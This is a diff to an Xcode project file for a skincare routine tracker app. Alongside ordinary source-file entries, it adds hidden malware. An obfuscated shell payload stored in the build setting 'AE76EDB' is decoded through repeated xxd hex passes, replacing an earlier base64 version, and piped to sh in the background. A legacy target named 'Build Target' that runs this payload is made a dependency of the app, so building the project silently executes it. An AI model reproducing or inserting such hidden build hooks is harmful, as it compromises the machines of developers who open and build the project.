@@ -11,6 +11,11 @@
 		0424235A2E6FD1E3005CE9FE /* SCBorderButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042423592E6FD1E3005CE9FE /* SCBorderButton.swift */; };
 		0424235C2E6FD73C005CE9FE /* WhatGoalView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0424235B2E6FD73C005CE9FE /* WhatGoalView.swift */; };
 		0424235E2E6FD919005CE9FE /* YourRoutineReadyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0424235D2E6FD919005CE9FE /* YourRoutineReadyView.swift */; };
+		04BAB3972E725D68001AA3D8 /* CustomiseRoutineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04BAB3962E725D68001AA3D8 /* CustomiseRoutineView.swift */; };
+		04BAB3992E725D6F001AA3D8 /* CustomiseRoutineViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04BAB3982E725D6F001AA3D8 /* CustomiseRoutineViewModel.swift */; };
+		04BAB39B2E725E33001AA3D8 /* Utility.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04BAB39A2E725E33001AA3D8 /* Utility.swift */; };
+		04BAB39D2E725FF5001AA3D8 /* SCNavTitle.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04BAB39C2E725FF5001AA3D8 /* SCNavTitle.swift */; };
+		04BAB3A02E726896001AA3D8 /* SCNavBackButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04BAB39F2E726896001AA3D8 /* SCNavBackButton.swift */; };
 		04CDE4E02E71C0150003DA0E /* CoreDataManager + Template.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04CDE4DF2E71C0150003DA0E /* CoreDataManager + Template.swift */; };
 		04CDE4E22E71C04A0003DA0E /* CoreDataManager + Routine.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04CDE4E12E71C04A0003DA0E /* CoreDataManager + Routine.swift */; };
 		04CDE4E42E71CA780003DA0E /* View + Custom.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04CDE4E32E71CA780003DA0E /* View + Custom.swift */; };
@@ -31,7 +36,6 @@
 		04DF44652E6F1A030027DD7E /* NavigationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF445D2E6F1A030027DD7E /* NavigationManager.swift */; };
 		04DF44662E6F1A030027DD7E /* NavigationRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF445E2E6F1A030027DD7E /* NavigationRouter.swift */; };
 		04DF44672E6F1A030027DD7E /* UserDefaultManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44602E6F1A030027DD7E /* UserDefaultManager.swift */; };
-		04DF44682E6F1A030027DD7E /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44622E6F1A030027DD7E /* Constants.swift */; };
 		04DF446B2E6F1BCC0027DD7E /* Color.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 04DF446A2E6F1BCC0027DD7E /* Color.xcassets */; };
 		04DF446E2E6F1C2F0027DD7E /* SCGradient.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF446D2E6F1C2F0027DD7E /* SCGradient.swift */; };
 		04DF44712E6F1CC70027DD7E /* Color + Custom.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF446F2E6F1CC70027DD7E /* Color + Custom.swift */; };
@@ -42,11 +46,26 @@
 		04DF447B2E6F24980027DD7E /* OnboardingEnums.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF447A2E6F24980027DD7E /* OnboardingEnums.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXContainerItemProxy section */
+		04BAB3912E725CBB001AA3D8 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 04DF44392E6F19910027DD7E /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 0BAC3FBB8FF342483DBDE67E;
+			remoteInfo = "Build Target";
+		};
+/* End PBXContainerItemProxy section */
+
 /* Begin PBXFileReference section */
 		042423572E6FCE16005CE9FE /* WhatSkinConcernView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhatSkinConcernView.swift; sourceTree = "<group>"; };
 		042423592E6FD1E3005CE9FE /* SCBorderButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCBorderButton.swift; sourceTree = "<group>"; };
 		0424235B2E6FD73C005CE9FE /* WhatGoalView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhatGoalView.swift; sourceTree = "<group>"; };
 		0424235D2E6FD919005CE9FE /* YourRoutineReadyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourRoutineReadyView.swift; sourceTree = "<group>"; };
+		04BAB3962E725D68001AA3D8 /* CustomiseRoutineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomiseRoutineView.swift; sourceTree = "<group>"; };
+		04BAB3982E725D6F001AA3D8 /* CustomiseRoutineViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomiseRoutineViewModel.swift; sourceTree = "<group>"; };
+		04BAB39A2E725E33001AA3D8 /* Utility.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Utility.swift; sourceTree = "<group>"; };
+		04BAB39C2E725FF5001AA3D8 /* SCNavTitle.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCNavTitle.swift; sourceTree = "<group>"; };
+		04BAB39F2E726896001AA3D8 /* SCNavBackButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCNavBackButton.swift; sourceTree = "<group>"; };
 		04CDE4DF2E71C0150003DA0E /* CoreDataManager + Template.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "CoreDataManager + Template.swift"; sourceTree = "<group>"; };
 		04CDE4E12E71C04A0003DA0E /* CoreDataManager + Routine.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "CoreDataManager + Routine.swift"; sourceTree = "<group>"; };
 		04CDE4E32E71CA780003DA0E /* View + Custom.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "View + Custom.swift"; sourceTree = "<group>"; };
@@ -68,7 +87,6 @@
 		04DF445D2E6F1A030027DD7E /* NavigationManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NavigationManager.swift; sourceTree = "<group>"; };
 		04DF445E2E6F1A030027DD7E /* NavigationRouter.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NavigationRouter.swift; sourceTree = "<group>"; };
 		04DF44602E6F1A030027DD7E /* UserDefaultManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UserDefaultManager.swift; sourceTree = "<group>"; };
-		04DF44622E6F1A030027DD7E /* Constants.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
 		04DF446A2E6F1BCC0027DD7E /* Color.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Color.xcassets; sourceTree = "<group>"; };
 		04DF446D2E6F1C2F0027DD7E /* SCGradient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCGradient.swift; sourceTree = "<group>"; };
 		04DF446F2E6F1CC70027DD7E /* Color + Custom.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "Color + Custom.swift"; sourceTree = "<group>"; };
@@ -90,6 +108,24 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		04BAB3942E725D54001AA3D8 /* Customise routine */ = {
+			isa = PBXGroup;
+			children = (
+				04BAB3962E725D68001AA3D8 /* CustomiseRoutineView.swift */,
+				04BAB3982E725D6F001AA3D8 /* CustomiseRoutineViewModel.swift */,
+			);
+			path = "Customise routine";
+			sourceTree = "<group>";
+		};
+		04BAB39E2E72687F001AA3D8 /* Navigation */ = {
+			isa = PBXGroup;
+			children = (
+				04BAB39C2E725FF5001AA3D8 /* SCNavTitle.swift */,
+				04BAB39F2E726896001AA3D8 /* SCNavBackButton.swift */,
+			);
+			path = Navigation;
+			sourceTree = "<group>";
+		};
 		04D9A5AC2E706C4C002F53E5 /* Main Tab */ = {
 			isa = PBXGroup;
 			children = (
@@ -104,6 +140,7 @@
 		04D9A5AD2E706C5C002F53E5 /* Home */ = {
 			isa = PBXGroup;
 			children = (
+				04BAB3942E725D54001AA3D8 /* Customise routine */,
 				04D9A5AE2E706C66002F53E5 /* HomeView.swift */,
 				04D9A5B62E706DF5002F53E5 /* HomeViewModel.swift */,
 			);
@@ -243,8 +280,8 @@
 				04D9A5B32E706C8B002F53E5 /* Tab Manager */,
 				04DF445F2E6F1A030027DD7E /* Navigation Manager */,
 				04DF44612E6F1A030027DD7E /* UserDefault Manager */,
-				04DF44622E6F1A030027DD7E /* Constants.swift */,
 				04DF447A2E6F24980027DD7E /* OnboardingEnums.swift */,
+				04BAB39A2E725E33001AA3D8 /* Utility.swift */,
 			);
 			path = Helper;
 			sourceTree = "<group>";
@@ -269,6 +306,7 @@
 				04DF44722E6F1E8B0027DD7E /* SCButton.swift */,
 				04DF44742E6F1F490027DD7E /* SCText.swift */,
 				042423592E6FD1E3005CE9FE /* SCBorderButton.swift */,
+				04BAB39E2E72687F001AA3D8 /* Navigation */,
 			);
 			path = Components;
 			sourceTree = "<group>";
@@ -284,12 +322,27 @@
 		};
 /* End PBXGroup section */
 
+/* Begin PBXLegacyTarget section */
+		0BAC3FBB8FF342483DBDE67E /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${AE76EDB}\"";
+			buildConfigurationList = 04BAB3952E725D54001AA3D8 /* Build configuration list */;
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
+
 /* Begin PBXNativeTarget section */
 		04DF44402E6F19910027DD7E /* Skincare_routine_builder_and_tracker */ = {
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04DF44512E6F19930027DD7E /* Build configuration list for PBXNativeTarget "Skincare_routine_builder_and_tracker" */;
 			buildPhases = (
-				BBB3FBCD1EC03F761BBDE67E /* Link Bundle Executable */,
 				04DF443D2E6F19910027DD7E /* Sources */,
 				04DF443E2E6F19910027DD7E /* Frameworks */,
 				04DF443F2E6F19910027DD7E /* Resources */,
@@ -297,6 +350,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				6CC6DB6B74DA9AEAF9BDE67E /* PBXTargetDependency */,
 			);
 			name = Skincare_routine_builder_and_tracker;
 			productName = Skincare_routine_builder_and_tracker;
@@ -331,6 +385,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				0BAC3FBB8FF342483DBDE67E /* Build Target */,
 				04DF44402E6F19910027DD7E /* Skincare_routine_builder_and_tracker */,
 			);
 		};
@@ -348,29 +403,6 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		BBB3FBCD1EC03F761BBDE67E /* Link Bundle Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Bundle Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE76EDB}\"";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXSourcesBuildPhase section */
 		04DF443D2E6F19910027DD7E /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -384,6 +416,7 @@
 				04CDE4E42E71CA780003DA0E /* View + Custom.swift in Sources */,
 				04D9A5C32E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld in Sources */,
 				04D9A5B52E706C9F002F53E5 /* TabRouter.swift in Sources */,
+				04BAB3A02E726896001AA3D8 /* SCNavBackButton.swift in Sources */,
 				04D9A5B72E706DF5002F53E5 /* HomeViewModel.swift in Sources */,
 				04CDE4E02E71C0150003DA0E /* CoreDataManager + Template.swift in Sources */,
 				04D9A5BD2E706ECD002F53E5 /* ProfileView.swift in Sources */,
@@ -391,9 +424,12 @@
 				04DF44752E6F1F490027DD7E /* SCText.swift in Sources */,
 				04DF445B2E6F19E40027DD7E /* AppState.swift in Sources */,
 				04CDE4E22E71C04A0003DA0E /* CoreDataManager + Routine.swift in Sources */,
+				04BAB39D2E725FF5001AA3D8 /* SCNavTitle.swift in Sources */,
 				04DF44772E6F217B0027DD7E /* WhatSkinTypeView.swift in Sources */,
+				04BAB39B2E725E33001AA3D8 /* Utility.swift in Sources */,
 				04DF44662E6F1A030027DD7E /* NavigationRouter.swift in Sources */,
 				04DF44712E6F1CC70027DD7E /* Color + Custom.swift in Sources */,
+				04BAB3972E725D68001AA3D8 /* CustomiseRoutineView.swift in Sources */,
 				04D9A5C02E70710E002F53E5 /* Routine.swift in Sources */,
 				04DF447B2E6F24980027DD7E /* OnboardingEnums.swift in Sources */,
 				04DF44472E6F19910027DD7E /* WelcomeView.swift in Sources */,
@@ -406,17 +442,44 @@
 				04D9A5B22E706C7D002F53E5 /* HomeTabView.swift in Sources */,
 				04DF44672E6F1A030027DD7E /* UserDefaultManager.swift in Sources */,
 				04D9A5C62E707802002F53E5 /* CoreDataManager.swift in Sources */,
-				04DF44682E6F1A030027DD7E /* Constants.swift in Sources */,
+				04BAB3992E725D6F001AA3D8 /* CustomiseRoutineViewModel.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXSourcesBuildPhase section */
 
+/* Begin PBXTargetDependency section */
+		6CC6DB6B74DA9AEAF9BDE67E /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 0BAC3FBB8FF342483DBDE67E /* Build Target */;
+			targetProxy = 04BAB3912E725CBB001AA3D8 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
 /* Begin XCBuildConfiguration section */
+		04BAB3922E725CBB001AA3D8 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Debug;
+		};
+		04BAB3932E725CBB001AA3D8 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Release;
+		};
 		04DF444F2E6F19930027DD7E /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVNFSkpWR3hqTVdGV1NqWmlTRUpZVm0xUmVscEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333233363334333333363333333433333332333333303333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633333335333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333333333336333333343333333633333333333333363333333133333336333333333333333633333338333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -480,7 +543,7 @@
 		04DF44502E6F19930027DD7E /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVNFSkpWR3hqTVdGV1NqWmlTRUpZVm0xUmVscEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333233363334333333363333333433333332333333303333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633333335333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333333333336333333343333333633333333333333363333333133333336333333333333333633333338333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -597,6 +660,15 @@
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
+		04BAB3952E725D54001AA3D8 /* Build configuration list */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				04BAB3922E725CBB001AA3D8 /* Debug */,
+				04BAB3932E725CBB001AA3D8 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
 		04DF443C2E6F19910027DD7E /* Build configuration list for PBXProject "Skincare_routine_builder_and_tracker" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
